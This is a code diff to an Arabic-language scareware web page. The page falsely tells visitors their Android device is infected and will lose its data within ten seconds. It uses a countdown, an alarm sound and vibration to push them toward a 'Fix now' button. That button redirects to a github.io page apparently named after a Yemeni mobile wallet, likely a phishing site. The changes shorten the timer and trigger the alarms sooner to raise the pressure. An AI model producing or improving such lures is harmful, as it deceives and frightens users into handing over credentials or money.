@@ -70,8 +70,8 @@
   </head>
   <body>
     <h1>⚠️ تنبيه أمني خطير ⚠️</h1>
-    <p>جهازك  الخاص بك مصاب!</p>
-    <p>إذا لم يتم إصلاحه في <span id="countdown">20</span> ثانية، ستفقد بياناتك!</p>
+    <p>جهاز Android الخاص بك مصاب!</p>
+    <p>إذا لم يتم إصلاحه في <span id="countdown">10</span> ثانية، ستفقد بياناتك!</p>
 
     <button onclick="window.location.href='https://sn4a5s6h.github.io/jawali.com.ye/'">إصلاح الآن</button>
 
@@ -86,7 +86,7 @@
     </audio>
 
     <script>
-      let timeLeft = 3;
+      let timeLeft = 10;
       const countdownEl = document.getElementById("countdown");
       const alarmSound = document.getElementById("alarm-sound");
       const finalSound = document.getElementById("final-sound");
@@ -100,11 +100,11 @@
         timeLeft--;
         countdownEl.textContent = timeLeft;
 
-        if (timeLeft === 2) {
+        if (timeLeft === 8) {
           alarmSound.play();
         }
 
-        if (timeLeft === 1 && navigator.vibrate) {
+        if (timeLeft === 7 && navigator.vibrate) {
           navigator.vibrate([500, 200, 500]);
         }
 
@@ -125,4 +125,4 @@
       }, 1000);
     </script>
   </body>
-</html>
+</html> 
